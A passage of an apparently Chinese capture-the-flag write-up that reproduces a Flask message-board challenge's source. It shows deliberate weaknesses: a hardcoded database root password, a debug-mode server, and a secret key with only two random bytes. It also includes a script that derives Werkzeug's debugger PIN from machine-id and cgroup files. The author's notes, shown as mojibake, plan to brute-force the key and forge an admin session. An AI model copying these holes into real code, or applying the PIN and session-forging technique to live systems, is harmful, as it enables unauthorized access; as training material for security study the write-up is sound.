class="token punctuation">:</span>                private <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                private <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">if</span> message <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("invalid input");window.location.href="/index";&lt;/script>'''</span>            dataSql<span class="token punctuation">.</span>uploadMessage<span class="token punctuation">(</span>username<span class="token punctuation">,</span> message<span class="token punctuation">,</span> nowtime<span class="token punctuation">,</span> private<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("upload successfully");window.location.href="/index";&lt;/script>'''</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/delete'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        psg <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'psg'</span><span class="token punctuation">)</span>        msg <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>dataSql<span class="token punctuation">.</span>showMessage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            h1 <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>            h1<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            h2 <span class="token operator">=</span> h1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token keyword">or</span> session<span class="token punctuation">[</span><span class="token string">'power'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'root'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> h2 <span class="token operator">==</span> psg<span class="token punctuation">:</span>                dataSql<span class="token punctuation">.</span>deleteMessage<span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("Permission denied");window.location.href="/index";&lt;/script>'''</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("login first");window.location.href="/index";&lt;/script>'''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index/api/getMessage'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> password <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'failed'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'invalid input'</span><span class="token punctuation">&#125;</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token keyword">not</span> dataSql<span class="token punctuation">.</span>canLogin<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'failed'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'username or password incorrect'</span><span class="token punctuation">&#125;</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>dataSql<span class="token punctuation">.</span>canLogin<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        msg <span class="token operator">=</span> getMsgList<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> dataSql<span class="token punctuation">.</span>getPower<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'guest'</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> msg<span class="token punctuation">:</span>                <span class="token comment"># remove the message send by other user on private condition</span>                <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">and</span> username <span class="token operator">!=</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                    msg<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">return</span> msg<span class="token keyword">def</span> <span class="token function">getMsgList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>dataSql<span class="token punctuation">.</span>showMessage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        h1 <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        h1<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token punctuation">[</span>h1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> msg<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span></code></pre><p><strong>datasql.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token keyword">import</span> time<span class="token keyword">import</span> getPINpin <span class="token operator">=</span> getPIN<span class="token punctuation">.</span>get_pin<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Database</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>max_retries <span class="token operator">=</span> max_retries        self<span class="token punctuation">.</span>db <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">def</span> <span class="token function">__enter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>db <span class="token operator">=</span> self<span class="token punctuation">.</span>connect_to_database<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>db<span class="token punctuation">,</span> self<span class="token punctuation">.</span>db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__exit__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> exc_type<span class="token punctuation">,</span> exc_val<span class="token punctuation">,</span> exc_tb<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>db <span class="token keyword">and</span> self<span class="token punctuation">.</span>db<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>db<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">connect_to_database</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        retries <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> retries <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>max_retries<span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>                    host<span class="token operator">=</span><span class="token string">"mysql"</span><span class="token punctuation">,</span>  <span class="token comment"># æ•°æ®åº“åœ°å€</span>                    port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>  <span class="token comment"># æ•°æ®åº“ç«¯å£</span>                    user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span>  <span class="token comment"># æ•°æ®åº“ç”¨æˆ·å</span>                    passwd<span class="token operator">=</span><span class="token string">"The_P0sswOrD_Y0u_Nev3r_Kn0w"</span><span class="token punctuation">,</span>  <span class="token comment"># æ•°æ®åº“å¯†ç </span>                    database<span class="token operator">=</span><span class="token string">"messageboard"</span><span class="token punctuation">,</span>  <span class="token comment"># æ•°æ®åº“å</span>                    charset<span class="token operator">=</span><span class="token string">'utf8'</span>                <span class="token punctuation">)</span>                <span class="token keyword">return</span> db            <span class="token keyword">except</span> pymysql<span class="token punctuation">.</span>Error <span class="token keyword">as</span> e<span class="token punctuation">:</span>                retries <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connection attempt </span><span class="token interpolation"><span class="token punctuation">&#123;</span>retries<span class="token punctuation">&#125;</span></span><span class="token string"> failed. Retrying in 5 seconds..."</span></span><span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Failed to connect to the database after maximum retries."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">canLogin</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string">'select password from users where username=%s'</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">:</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string">'select username from users where username=%s'</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            sql <span class="token operator">=</span> <span class="token string">'insert into users (id,username,password,power) values (%s,%s,%s,%s)'</span>            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">)</span>            db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">changePassword</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>oldPassword<span class="token punctuation">,</span>newPassword<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string">'select password from users where username=%s'</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">:</span>            <span class="token keyword">if</span> oldPassword <span class="token operator">==</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                sql <span class="token operator">=</span> <span class="token string">'update users set password=%s where username=%s'</span>                cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span>newPassword<span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>                db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"wrong password"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"username doesn't exist."</span><span class="token keyword">def</span> <span class="token function">uploadMessage</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>message<span class="token punctuation">,</span>nowtime<span class="token punctuation">,</span>private<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string">'insert into message (username,data,time,private) values (%s,%s,%s,%s)'</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span>message<span class="token punctuation">,</span>nowtime<span class="token punctuation">,</span>private<span class="token punctuation">)</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">showMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string">'select * from message'</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'128-243-397'</span><span class="token punctuation">,</span> pin<span class="token punctuation">)</span> <span class="token keyword">for</span> elem <span class="token keyword">in</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">]</span>        <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">usersName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string">'select * from users'</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getPower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string">'select power from users where username=%s'</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">deleteMessage</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>pubTime<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string">'delete from message where username=%s and time=%s'</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>pubTime<span class="token punctuation">)</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span></code></pre><p><strong>getPIN.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain<span class="token keyword">import</span> uuid<span class="token keyword">def</span> <span class="token function">get_pin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'root'</span><span class="token comment"># username  /proc/self/environ</span>        <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># modname</span>        <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>        <span class="token string">'/usr/local/lib/python3.9/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),</span>    <span class="token punctuation">]</span>    uuid1 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    linux <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>    <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> value<span class="token punctuation">:</span>            linux <span class="token operator">+=</span> value            <span class="token keyword">break</span>    <span class="token comment"># Containers share the same machine id, add some cgroup</span>    <span class="token comment"># information. This is used outside containers too but should be</span>    <span class="token comment"># relatively stable across boots.</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    linux <span class="token operator">=</span> linux<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>        uuid1<span class="token punctuation">,</span>        linux<span class="token punctuation">,</span>    <span class="token punctuation">]</span>    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>                <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    num <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    rv<span class="token operator">=</span><span class="token boolean">None</span>    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> num    <span class="token keyword">return</span> rv</code></pre><p>åˆæ­¥åˆ†æä»£ç æ¥çœ‹éœ€è¦ä¼ªé€ sessionä¼šè¯ç„¶åç™»å½•ç®¡ç†å‘˜è´¦å·</p><pre class="language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"This-random-secretKey-you-can't-get"</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#å…³é”®ä»£ç ä¸ºè¿™ä¸€è¡Œå‰é¢å€¼å›ºå®šåé¢ä¸å”¯ä¸€ç³»ç»Ÿéšæœºç”Ÿæˆä½¿ç”¨pythonè„šæœ¬è¿›è¡Œæš´åŠ›æšä¸¾</span></code></pre><p>è¿™ä¸ªé¢˜ç›®å’ŒæŸä¸€ä¸ªé¢˜ç›®éå¸¸çš„ç›¸ä¼¼</p><p>[<a 